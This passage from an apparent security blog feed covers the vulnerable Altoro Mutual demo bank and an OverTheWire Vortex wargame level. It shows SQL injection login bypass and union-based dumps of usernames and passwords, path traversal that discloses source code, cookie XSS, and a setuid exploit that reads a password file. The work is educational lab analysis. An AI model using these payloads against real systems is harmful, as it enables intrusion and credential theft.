    }
    protected string ValidateUser(String uName, String pWord)
    {
      //Set default status to Success
      string status = &#34;Success&#34;;
      OleDbConnection myConnection = new OleDbConnection();
      myConnection.ConnectionString = ConfigurationManager.ConnectionStrings[&#34;DBConnStr&#34;].ConnectionString;
      myConnection.Open();
      string query2 = &#34;SELECT * From users WHERE username = &#39;&#34; + uName + &#34;&#39;&#34;;
      string query1 = query2 + &#34; AND password = &#39;&#34; + pWord + &#34;&#39;&#34;;
      if (ConfigurationManager.ConnectionStrings[&#34;DBConnStr&#34;].ConnectionString.Contains(&#34;Microsoft.Jet.OLEDB.4.0&#34;))
      {
          // Hack for MS Access which can not terminate a string
          query1 = Regex.Replace(query1, &#34;--.*&#34;, &#34;&#34;);
          query2 = Regex.Replace(query2, &#34;--.*&#34;, &#34;&#34;);
      }
      DataSet ds = new DataSet();
      OleDbDataAdapter myLogin = new OleDbDataAdapter(query1, myConnection);
      myLogin.Fill(ds, &#34;user&#34;);
      if (ds.Tables[&#34;user&#34;].Rows.Count==0)
      {
              OleDbDataAdapter myFailed = new OleDbDataAdapter(query2, myConnection);
              myFailed.Fill(ds, &#34;user&#34;);
        if (ds.Tables[&#34;user&#34;].Rows.Count==0)
        {
             status = &#34;We&#39;re sorry, but this username was not found in our system.  Please try again.&#34;;
        }
        else
        {
            status = &#34;Your password appears to be invalid.  Please re-enter your password carefully.&#34;;
        }
      }
      else
      {
                //Get the row returned by the query
                DataRow myRow = ds.Tables[&#34;user&#34;].Rows[0];
          //Set the Session variables.
          Session[&#34;userId&#34;] = myRow[&#34;userid&#34;];
          Session[&#34;userName&#34;] = myRow[&#34;username&#34;];
          Session[&#34;firstName&#34;] = myRow[&#34;first_name&#34;];
          Session[&#34;lastName&#34;] = myRow[&#34;last_name&#34;];
          Session[&#34;authenticated&#34;] = true;
          //Close the database collection.
          myConnection.Close();
          //Set UserInfo cookie
          DateTime dtNow = DateTime.Now;
          TimeSpan tsHour = new TimeSpan(0, 0, 180, 0);
          string sCookieUser = new Base64Decoder(uName).GetDecoded();
          HttpCookie UserInfo = Request.Cookies[&#34;amUserInfo&#34;];
          if ((UserInfo == null) || (sCookieUser != Session[&#34;userName&#34;].ToString()))
          {
              UserInfo = new HttpCookie(&#34;amUserInfo&#34;);
              UserInfo[&#34;UserName&#34;] = new Base64Encoder(uName).GetEncoded();
              UserInfo[&#34;Password&#34;] = new Base64Encoder(pWord).GetEncoded();
              UserInfo.Expires = dtNow.Add(tsHour);
              Response.Cookies.Add(UserInfo);
          }
          HttpCookie UserId = Request.Cookies[&#34;amUserId&#34;];
          UserId = new HttpCookie(&#34;amUserId&#34;);
          UserId.Value = Session[&#34;userId&#34;].ToString();
          Response.Cookies.Add(UserId);
          query1 = &#34;SELECT userid, approved, card_type,interest, limit FROM promo WHERE userid=&#34; + Session[&#34;userId&#34;];
          OleDbDataAdapter myApproval = new OleDbDataAdapter(query1, myConnection);
          myApproval.Fill(ds, &#34;promo&#34;);
          DataTable myTable = ds.Tables[&#34;promo&#34;];
          DataRow curRow = myTable.Rows[0];
          if (System.Convert.ToBoolean(curRow[&#34;approved&#34;]))
          {
            HttpCookie CreditOffer = Request.Cookies[&#34;amCreditOffer&#34;];
                CreditOffer = new HttpCookie(&#34;amCreditOffer&#34;);
            CreditOffer[&#34;CardType&#34;] = curRow[&#34;card_type&#34;].ToString();
            CreditOffer[&#34;Limit&#34;] = curRow[&#34;limit&#34;].ToString();
            CreditOffer[&#34;Interest&#34;] = curRow[&#34;interest&#34;].ToString();
                Response.Cookies.Add(CreditOffer);
          }
      }
      myConnection.Close();
      return status;
    }
      protected string GetUserName()
      {
          HttpCookie UserInfo = Request.Cookies[&#34;amUserInfo&#34;];
          if (Request.Params[&#34;uid&#34;] != null)
          {
              return Request.Params[&#34;uid&#34;].ToString();
          }
          if (UserInfo != null)
          {
              return new Base64Decoder(UserInfo[&#34;UserName&#34;]).GetDecoded();
          }
          else
          {
              return &#34;&#34;;
          }
      }
    #region Web Form Designer generated code
    override protected void OnInit(EventArgs e)
    {
      //
      // CODEGEN: This call is required by the ASP.NET Web Form Designer.
      //
      InitializeComponent();
      base.OnInit(e);
    }
    /// &lt;summary&gt;
    /// Required method for Designer support - do not modify
    /// the contents of this method with the code editor.
    /// &lt;/summary&gt;
    private void InitializeComponent()
    {
    }
    #endregion
  }
}
</code></pre></div><h3 id="brute-force-vulnerability">Brute force vulnerability</h3>
<p>Before we investigate the code, let&rsquo;s have a look at a much common vulnerability. Go toÂ <a href="http://demo.testfire.net/bank/login.aspx">http://demo.testfire.net/bank/login.aspx</a>Â and use a random user for the login process. You&rsquo;ll get:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">Login Failed: We&#39;re sorry, but this username was not found in our system. Please try again.
</code></pre></div><p>You could now easilyÂ <strong>bruteforce</strong>Â common usernames in order to login into the application. The same works with passwords too: <em>admin</em>Â seems to be a valid username. Try to bruteforce the password and you&rsquo;ll get:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">Login Failed: Your password appears to be invalid. Please re-enter your password carefully.
</code></pre></div><p><em>admin:admin</em>Â is a valid username/password combination.</p>
<h3 id="sql-injection-using-post-parameters">SQL injection using POST parameters</h3>
<p>Now let&rsquo;s have a closer look at the source code&hellip; Let&rsquo;s analyze theÂ <em>!ValidateUser</em>function:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">protected string ValidateUser(String uName, String pWord)
    {
      //Set default status to Success
      string status = &#34;Success&#34;;
      OleDbConnection myConnection = new OleDbConnection();
      myConnection.ConnectionString = ConfigurationManager.ConnectionStrings[&#34;DBConnStr&#34;].ConnectionString;
      myConnection.Open();
      string query2 = &#34;SELECT * From users WHERE username = &#39;&#34; + uName + &#34;&#39;&#34;;
      string query1 = query2 + &#34; AND password = &#39;&#34; + pWord + &#34;&#39;&#34;;
      if (ConfigurationManager.ConnectionStrings[&#34;DBConnStr&#34;].ConnectionString.Contains(&#34;Microsoft.Jet.OLEDB.4.0&#34;))
      {
          // Hack for MS Access which can not terminate a string
          query1 = Regex.Replace(query1, &#34;--.*&#34;, &#34;&#34;);
          query2 = Regex.Replace(query2, &#34;--.*&#34;, &#34;&#34;);
      }
      ....
</code></pre></div><p>As you can see the <em>uName</em>Â parameter doesn&rsquo;t get sanitized, so you can easily run someÂ <strong>SQL injection</strong>. Let&rsquo;s try that out. UsingÂ <a href="http://www.portswigger.net/burp/">Burpsuite</a>Â we&rsquo;ll tamper data sent to the web server and analyze the responses.</p>
<p>Here&rsquo;s the request:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-.html" data-lang=".html">POST /bank/login.aspx HTTP/1.1
Host: demo.testfire.net
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:10.0.6) Gecko/20100101 Firefox/10.0.6
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-us,en;q=0.5
Accept-Encoding: gzip, deflate
Proxy-Connection: keep-alive
Referer: http://demo.testfire.net/bank/login.aspx
Cookie: ASP.NET_SessionId=2ks1fprgokgkd0jthbms3d25; amSessionId=62733112717
Content-Type: application/x-www-form-urlencoded
Content-Length: 39
uid=admin%27<span style="color:#a61717;background-color:#e3d2d2">&amp;</span>passw=test<span style="color:#a61717;background-color:#e3d2d2">&amp;</span>btnSubmit=Login
</code></pre></div><p>As a response you&rsquo;ll get:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">An Error Has Occurred
Summary:
Syntax error (missing operator) in query expression &#39;username = &#39;admin&#39;&#39; AND password = &#39;test&#39;&#39;.
Error Message:
System.Data.OleDb.OleDbException: Syntax error (missing operator) in query expression &#39;username = &#39;admin&#39;&#39; AND password = &#39;test&#39;&#39;. at System.Data.OleDb.OleDbCommand.ExecuteCommandTextErrorHandling(OleDbHResult hr) at System.Data.OleDb.OleDbCommand.ExecuteCommandTextForSingleResult(tagDBPARAMS dbParams, Object&amp; executeResult) at System.Data.OleDb.OleDbCommand.ExecuteCommandText(Object&amp; executeResult) at System.Data.OleDb.OleDbCommand.ExecuteCommand(CommandBehavior behavior, Object&amp; executeResult) at System.Data.OleDb.OleDbCommand.ExecuteReaderInternal(CommandBehavior behavior, String method) at System.Data.OleDb.OleDbCommand.ExecuteReader(CommandBehavior behavior) at System.Data.OleDb.OleDbCommand.System.Data.IDbCommand.ExecuteReader(CommandBehavior behavior) at System.Data.Common.DbDataAdapter.FillInternal(DataSet dataset, DataTable[] datatables, Int32 startRecord, Int32 maxRecords, String srcTable, IDbCommand command, CommandBehavior behavior) at System.Data.Common.DbDataAdapter.Fill(DataSet dataSet, Int32 startRecord, Int32 maxRecords, String srcTable, IDbCommand command, CommandBehavior behavior) at System.Data.Common.DbDataAdapter.Fill(DataSet dataSet, String srcTable) at Altoro.Authentication.ValidateUser(String uName, String pWord) in d:downloadsAltoroMutual_v6websitanklogin.aspx.cs:line 68 at Altoro.Authentication.Page_Load(Object sender, EventArgs e) in d:downloadsAltoroMutual_v6websitanklogin.aspx.cs:line 33 at System.Web.Util.CalliHelper.EventArgFunctionCaller(IntPtr fp, Object o, Object t, EventArgs e) at System.Web.Util.CalliEventHandlerDelegateProxy.Callback(Object sender, EventArgs e) at System.Web.UI.Control.OnLoad(EventArgs e) at System.Web.UI.Control.LoadRecursive() at System.Web.UI.Page.ProcessRequestMain(Boolean includeStagesBeforeAsyncPoint, Boolean includeStagesAfterAsyncPoint)
</code></pre></div><p><em>Single quotes</em>Â are obvisouly not escaped so we could inject some SQL statements. Let&rsquo;s try some common ones likeÃ‚Â <strong>admin' OR 1=1;-</strong>:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-.html" data-lang=".html">POST /bank/login.aspx HTTP/1.1
Host: demo.testfire.net
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:10.0.6) Gecko/20100101 Firefox/10.0.6
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-us,en;q=0.5
Accept-Encoding: gzip, deflate
Proxy-Connection: keep-alive
Referer: http://demo.testfire.net/bank/login.aspx
Cookie: ASP.NET_SessionId=2ks1fprgokgkd0jthbms3d25; amSessionId=62733112717
Content-Type: application/x-www-form-urlencoded
Content-Length: 47
uid=admin&#39; OR 1=1;--<span style="color:#a61717;background-color:#e3d2d2">&amp;</span>passw=test<span style="color:#a61717;background-color:#e3d2d2">&amp;</span>btnSubmit=Login
</code></pre></div><p>The result looks very promising! We were able to login without specifying any password. All you need is a valid username. The same vulnerability applies to theÃ‚Â <em>password</em>Â field as well. Following request will work too:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-.html" data-lang=".html">POST /bank/login.aspx HTTP/1.1
Host: demo.testfire.net
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:10.0.6) Gecko/20100101 Firefox/10.0.6
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-us,en;q=0.5
Accept-Encoding: gzip, deflate
Proxy-Connection: keep-alive
Referer: http://demo.testfire.net/bank/login.aspx
Cookie: ASP.NET_SessionId=2ks1fprgokgkd0jthbms3d25; amSessionId=62733112717; amUserInfo=UserName=YWRtaW4nIE9SIDE9MjstLQ==<span style="color:#a61717;background-color:#e3d2d2">&amp;</span>Password=dGVzdA==
Content-Type: application/x-www-form-urlencoded
Content-Length: 50
uid=admin<span style="color:#a61717;background-color:#e3d2d2">&amp;</span>passw=&#39; OR 1=1;--<span style="color:#a61717;background-color:#e3d2d2">&amp;</span>btnSubmit=Login
</code></pre></div><h3 id="base64-encoded-login-credentials">Base64-encoded login credentials</h3>
<p>After a successful login the server will set a cookieÂ <em>amUserInfo</em>Â which contains login information encoded in base64. This is for sure a vulnerability since an attacker could easily decode the information and get the login credentials.</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">amUserInfo=UserName=YWRtaW4nIE9SIDE9MjstLQ==&amp;Password=dGVzdA==
</code></pre></div><p>decodes to&hellip;</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">amUserInfo=Username=admin&#39; OR 1=2;--&amp;Password=test
</code></pre></div><h2 id="bankmainaspx">/bank/main.aspx</h2>
<p>After a successful login you&rsquo;ll be redirected toÂ <a href="http://demo.testfire.net/bank/main.aspx">http://demo.testfire.net/bank/main.aspx</a>. Let&rsquo;s have a look at the functionalities within this page.</p>
<h3 id="source-code-disclosure">Source code disclosure&lt;</h3>
<p>Here&rsquo;s the source code (<a href="http://demo.testfire.net/default.aspx?content=../bank/main.aspx.cs%EF%BF%BD.txt">http://demo.testfire.net/default.aspx?content=../bank/main.aspx.cs%00.txt</a>)</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">using System.Collections;
using System.ComponentModel;
using System.Data;
using System.Data.OleDb;
using System.Web;
using System.Web.SessionState;
using System.Web.UI;
using System.Web.UI.WebControls;
using System.Web.UI.HtmlControls;
using System.Configuration;
namespace Altoro
{
    /// &lt;summary&gt;
    /// Summary description for welcome.
    /// &lt;/summary&gt;
    public partial class Default : Page
    {
        protected void Page_Load(object sender, System.EventArgs e)
        {
            Response.Cache.SetCacheability(HttpCacheability.NoCache);
            if (!(System.Convert.ToBoolean(Session[&#34;authenticated&#34;])))
            {
                Server.Transfer(&#34;logout.aspx&#34;);
            }
            string thisUser = Request.Cookies[&#34;amUserId&#34;].Value;
            DataRow myRow;
            DataTable acctTable = GetAccounts(thisUser);
            CheckPromo(thisUser);
            for (int i = 0; i &lt; acctTable.Rows.Count; i++)
            {
                myRow = acctTable.Rows[i];
                ArrayList myList = new ArrayList();
                myList.Add(myRow[&#34;accountid&#34;].ToString());
                myList.Add(myRow[&#34;accountid&#34;].ToString() + &#34; &#34; + myRow[&#34;acct_type&#34;].ToString());
                listAccounts.myItems.Add(myList);
            }
        }
        private DataTable GetAccounts(string userId)
        {
            OleDbConnection myConnection = new OleDbConnection();
            myConnection.ConnectionString = ConfigurationManager.ConnectionStrings[&#34;DBConnStr&#34;].ConnectionString;
            myConnection.Open();
            string query = &#34;SELECT accountid, acct_type From accounts WHERE userid = &#34; + userId;
            OleDbDataAdapter myAccounts = new OleDbDataAdapter(query, myConnection);
            DataSet ds = new DataSet();
            myAccounts.Fill(ds, &#34;accounts&#34;);
            DataTable myTable = ds.Tables[&#34;accounts&#34;];
            myConnection.Close();
            return myTable;
        }
        private void WritePromo(string cType, string cLimit, string cInterest)
        {
            string promoText = &#34;&lt;table width=590 border=0&gt;&#34;;
            promoText += &#34;&lt;tr&gt;&lt;td&gt;&lt;h2&gt;Congratulations! &lt;/h2&gt;&lt;/td&gt;&lt;/tr&gt;&#34;;
            promoText += &#34;&lt;tr&gt;&lt;td&gt;You have been pre-approved for an Altoro &#34;;
            promoText += cType;
            promoText += &#34; Visa with a credit limit of $&#34;;
            promoText += cLimit;
            promoText += &#34;!&lt;/td&gt;&lt;/tr&gt;&#34;;
            promoText += &#34;&lt;tr&gt;&lt;td&gt;Click &lt;a href=&#39;apply.aspx&#34;;
            promoText += &#34;&#39;&gt;Here&lt;/a&gt; to apply.&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&#34;;
            promo.Visible = true;
            promo.Text = promoText;
        }
        private void CheckPromo(string strUserId)
        {
            if (Request.Cookies[&#34;amCreditOffer&#34;] != null)
            {
                    HttpCookie CreditOffer = Request.Cookies[&#34;amCreditOffer&#34;];
              WritePromo(CreditOffer[&#34;CardType&#34;], CreditOffer[&#34;Limit&#34;], CreditOffer[&#34;Interest&#34;]);
            }
        }
        protected String GetSessionValue(String key)
        {
            if (Request.Cookies[&#34;amUserId&#34;].Value==Session[&#34;userId&#34;].ToString())
            {
                return Session[key].ToString();
                }
                else
                {
                        return &#34;&#34;;
                }
        }
        #region Web Form Designer generated code
        override protected void OnInit(EventArgs e)
        {
            //
            // CODEGEN: This call is required by the ASP.NET Web Form Designer.
            //
            InitializeComponent();
            base.OnInit(e);
        }
        /// &lt;summary&gt;
        /// Required method for Designer support - do not modify
        /// the contents of this method with the code editor.
        /// &lt;/summary&gt;
        private void InitializeComponent()
        {
        }
        #endregion
    }
}
</code></pre></div><h3 id="sql-injection-using-cookie-data">SQL injection using Cookie data</h3>
<p>After login following request will be sent to the server:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-.html" data-lang=".html">GET /bank/main.aspx HTTP/1.1
Host: demo.testfire.net
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:10.0.6) Gecko/20100101 Firefox/10.0.6
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-us,en;q=0.5
Accept-Encoding: gzip, deflate
Proxy-Connection: keep-alive
Referer: http://demo.testfire.net/bank/login.aspx
Cookie: ASP.NET_SessionId=2ks1fprgokgkd0jthbms3d25; amSessionId=62733112717; amUserInfo=UserName=YWRtaW4=&amp;Password=YWRtaW4=; amUserId=1
</code></pre></div><p>A look at theÂ <em>GetAccounts</em>Â in the source code reveals thatÂ <em>userId</em>Â is actually some data from the cookieÂ <em>amUserId</em>Â and never gets sanitized. Let&rsquo;s have some fun:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">GET /bank/main.aspx HTTP/1.1
...
amUserInfo=UserName=YWRtaW4=&amp;Password=YWRtaW4=; amUserId=1&#39;
</code></pre></div><p><em>amUserId</em>Â was changed and the whole GET request was sent again to the server. The response was quite informative:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">An Error Has Occurred
Summary:
Syntax error in string in query expression &#39;userid = 1&#39;&#39;.
Error Message:
System.Data.OleDb.OleDbException: Syntax error in string in query expression &#39;userid = 1&#39;&#39;. at System.Data.OleDb.OleDbCommand.ExecuteCommandTextErrorHandling(OleDbHResult hr) at System.Data.OleDb.OleDbCommand.ExecuteCommandTextForSingleResult(tagDBPARAMS dbParams, Object&amp; executeResult) at System.Data.OleDb.OleDbCommand.ExecuteCommandText(Object&amp; executeResult) at System.Data.OleDb.OleDbCommand.ExecuteCommand(CommandBehavior behavior, Object&amp; executeResult) at System.Data.OleDb.OleDbCommand.ExecuteReaderInternal(CommandBehavior behavior, String method) at System.Data.OleDb.OleDbCommand.ExecuteReader(CommandBehavior behavior) at System.Data.OleDb.OleDbCommand.System.Data.IDbCommand.ExecuteReader(CommandBehavior behavior) at System.Data.Common.DbDataAdapter.FillInternal(DataSet dataset, DataTable[] datatables, Int32 startRecord, Int32 maxRecords, String srcTable, IDbCommand command, CommandBehavior behavior) at System.Data.Common.DbDataAdapter.Fill(DataSet dataSet, Int32 startRecord, Int32 maxRecords, String srcTable, IDbCommand command, CommandBehavior behavior) at System.Data.Common.DbDataAdapter.Fill(DataSet dataSet, String srcTable) at Altoro.Default.GetAccounts(String userId) in d:downloadsAltoroMutual_v6websitankmain.aspx.cs:line 54 at Altoro.Default.Page_Load(Object sender, EventArgs e) in d:downloadsAltoroMutual_v6websitankmain.aspx.cs:line 31 at System.Web.Util.CalliHelper.EventArgFunctionCaller(IntPtr fp, Object o, Object t, EventArgs e) at System.Web.Util.CalliEventHandlerDelegateProxy.Callback(Object sender, EventArgs e) at System.Web.UI.Control.OnLoad(EventArgs e) at System.Web.UI.Control.LoadRecursive() at System.Web.UI.Page.ProcessRequestMain(Boolean includeStagesBeforeAsyncPoint, Boolean includeStagesAfterAsyncPoint)
</code></pre></div><p>Ahhh, there we go!Â <strong>Another SQL injection vulnerability!</strong>Â You could now dump some data:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-.html" data-lang=".html">GET /bank/main.aspx HTTP/1.1
Host: demo.testfire.net
...
amUserInfo=UserName=YWRtaW4=&amp;Password=YWRtaW4=; amUserId=2 union select accountid, acct_type from accounts;--
</code></pre></div><p>You could use this vulnerability toÂ <strong>dump theÂ <em>users</em>Â table</strong>:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-.html" data-lang=".html">GET /bank/main.aspx HTTP/1.1
Host: demo.testfire.net
...
amUserInfo=UserName=YWRtaW4=&amp;Password=YWRtaW4=; amUserId=2 union select username, password from users;--
</code></pre></div><p>This will return:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">admin admin
cclay Ali
jsmith Demo1234
sjoe frazier
sspeed Demo1234
tuser tuser
</code></pre></div><p>Simple, isn&rsquo;t it?</p>
<h3 id="xss-using-cookie-data">XSS using cookie data</h3>
<p>Alternatively you could combine SQLi with XSS:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-.html" data-lang=".html">GET /bank/main.aspx HTTP/1.1
Host: demo.testfire.net
...
amUserInfo=UserName=YWRtaW4=&amp;Password=YWRtaW4=; amUserId=2 union select &#34;&lt;<span style="color:#6ab825;font-weight:bold">script</span>&gt;...&lt;/<span style="color:#6ab825;font-weight:bold">script</span>&gt;&#34;, &#34;Injection FOUND!&#34; from accounts;--
</code></pre></div>]]></content:encoded>
    </item>
    
    <item>
      <title>OverTheWire: Vortex Level1</title>
      <link>https://blog.dornea.nu/2013/05/03/overthewire-vortex-level1/</link>
      <pubDate>Fri, 03 May 2013 00:00:00 +0000</pubDate>
      
      <guid>https://blog.dornea.nu/2013/05/03/overthewire-vortex-level1/</guid>
      <content:encoded><![CDATA[<p>Solution for <a href="http://www.overthewire.org/wargames/vortex/vortex1.shtml">http://www.overthewire.org/wargames/vortex/vortex1.shtml</a>. Here&rsquo;s the code they have used:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-.c" data-lang=".c"><span style="color:#cd2828;font-weight:bold">#include</span> 
<span style="color:#cd2828;font-weight:bold">#include </span><span style="color:#cd2828;font-weight:bold">
</span><span style="color:#cd2828;font-weight:bold">#include</span> 
<span style="color:#cd2828;font-weight:bold">#include</span><span style="color:#cd2828;font-weight:bold">
</span><span style="color:#cd2828;font-weight:bold"></span>
<span style="color:#cd2828;font-weight:bold">#define e(); if(((unsigned int)ptr &amp; 0xff000000)==0xca000000) { setresuid(geteuid(), geteuid(), geteuid()); execlp(&#34;/bin/sh&#34;, &#34;sh&#34;, &#34;-i&#34;, NULL); }
</span><span style="color:#cd2828;font-weight:bold"></span>
<span style="color:#6ab825;font-weight:bold">void</span> <span style="color:#447fcf">print</span>(<span style="color:#6ab825;font-weight:bold">unsigned</span> <span style="color:#6ab825;font-weight:bold">char</span> *buf, <span style="color:#6ab825;font-weight:bold">int</span> len)
{
        <span style="color:#6ab825;font-weight:bold">int</span> i;

        printf(<span style="color:#ed9d13">&#34;[ &#34;</span>);
        <span style="color:#6ab825;font-weight:bold">for</span>(i=<span style="color:#3677a9">0</span>; i &lt; len; i++) printf(<span style="color:#ed9d13">&#34;%x &#34;</span>, buf[i]); 
        printf(<span style="color:#ed9d13">&#34; ]</span><span style="color:#ed9d13">\n</span><span style="color:#ed9d13">&#34;</span>);
}

<span style="color:#6ab825;font-weight:bold">int</span> <span style="color:#447fcf">main</span>()
{
        <span style="color:#6ab825;font-weight:bold">unsigned</span> <span style="color:#6ab825;font-weight:bold">char</span> buf[<span style="color:#3677a9">512</span>];
        <span style="color:#6ab825;font-weight:bold">unsigned</span> <span style="color:#6ab825;font-weight:bold">char</span> *ptr = buf + (<span style="color:#6ab825;font-weight:bold">sizeof</span>(buf)/<span style="color:#3677a9">2</span>);
        <span style="color:#6ab825;font-weight:bold">unsigned</span> <span style="color:#6ab825;font-weight:bold">int</span> x;

        <span style="color:#6ab825;font-weight:bold">while</span>((x = getchar()) != EOF) {
                <span style="color:#6ab825;font-weight:bold">switch</span>(x) {
                        <span style="color:#6ab825;font-weight:bold">case</span> <span style="color:#ed9d13">&#39;\n&#39;</span>: print(buf, <span style="color:#6ab825;font-weight:bold">sizeof</span>(buf)); <span style="color:#6ab825;font-weight:bold">continue</span>; <span style="color:#6ab825;font-weight:bold">break</span>;
                        <span style="color:#6ab825;font-weight:bold">case</span> <span style="color:#ed9d13">&#39;\\&#39;</span>: ptr--; <span style="color:#6ab825;font-weight:bold">break</span>; 
                        <span style="color:#6ab825;font-weight:bold">default</span>: e(); <span style="color:#6ab825;font-weight:bold">if</span>(ptr &gt; buf + <span style="color:#6ab825;font-weight:bold">sizeof</span>(buf)) <span style="color:#6ab825;font-weight:bold">continue</span>; ptr++[<span style="color:#3677a9">0</span>] = x; <span style="color:#6ab825;font-weight:bold">break</span>;
                }
        }
        printf(<span style="color:#ed9d13">&#34;All done</span><span style="color:#ed9d13">\n</span><span style="color:#ed9d13">&#34;</span>);
}
</code></pre></div><p>The executable was at /<strong>vortex</strong>/vortex1:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">$ ls -l /vortex/vortex1
-r-sr-x--- 1 vortex2 vortex1 7398 2011-11-13 23:07 /vortex/vortex1
</code></pre></div><p>I hope you have noticed the SETUID-Bit which belongs to user vortex2. So that programm will run as vortex2. The password we need to find out is at /etc/vortex_pass/vortex2. Now letâ€™s analyze the code&hellip;</p>
<ul>
<li>There is a buffer <code>buf</code> of size 512 * ptr points at the middle of the buffer</li>
<li>Everytime &ldquo;&quot;&rdquo; is read in, <code>ptr</code> is decremented. So we need to set ptr to the beginning of <code>buf</code>&rsquo;s address</li>
<li><code>e()</code> is a macro which checks if <code>*ptr = 0xCA</code>. If this is true, then an &ldquo;interactive shell will be launched. This is what I did:</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">$ python -c &#39;print &#34;\\&#34;*257 + &#34;\xca&#34; + &#34;XXX&#34;&#39; | /vortex/vortex1 
$ 
</code></pre></div><p>Nothing happens. We need to execute the new process (/bin/sh) with some &ldquo;extra arguments&rdquo;. I have created following script:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">$ cat script.sh 
cat /etc/vortex_pass/vortex2
</code></pre></div><p>&hellip;then as the bash manual states:</p>
<blockquote>
<p>&ldquo;When invoked as an interactive shell with the name sh, bash looks for the variable ENV, expands its value if it is defined, and uses the expanded value as the name of a file to read and execute&rdquo;</p>
</blockquote>
<p>We&rsquo;ll need to set the ENV variable properly and we&rsquo;re done:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">$ python -c &#39;print &#34;\\&#34;*257 + &#34;\xca&#34; + &#34;XXX&#34;&#39; | env ENV=/tmp/****/script.sh /vortex/vortex1 
******
$ 
</code></pre></div>]]></content:encoded>
    </item>
    
    <item>
      <title>OverTheWire: Vortex Level2</title>
      <link>https://blog.dornea.nu/2013/05/02/overthewire-vortex-level2/</link>
      <pubDate>Thu, 02 May 2013 00:00:00 +0000</pubDate>
      
      <guid>https://blog.dornea.nu/2013/05/02/overthewire-vortex-level2/</guid>
      <content:encoded><![CDATA[<p>Solution for <a href="http://www.overthewire.org/wargames/vortex/vortex2.shtml">level2</a>:</p>
<p>Here is the code:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-.c" data-lang=".c"><span style="color:#cd2828;font-weight:bold">#include</span> <span style="color:#cd2828;font-weight:bold">&lt;stdlib.h&gt;</span><span style="color:#cd2828;font-weight:bold">
</span><span style="color:#cd2828;font-weight:bold">#include</span> <span style="color:#cd2828;font-weight:bold">&lt;stdio.h&gt;</span><span style="color:#cd2828;font-weight:bold">
</span><span style="color:#cd2828;font-weight:bold">#include</span> <span style="color:#cd2828;font-weight:bold">&lt;sys/types.h&gt;</span><span style="color:#cd2828;font-weight:bold">
</span><span style="color:#cd2828;font-weight:bold"></span>

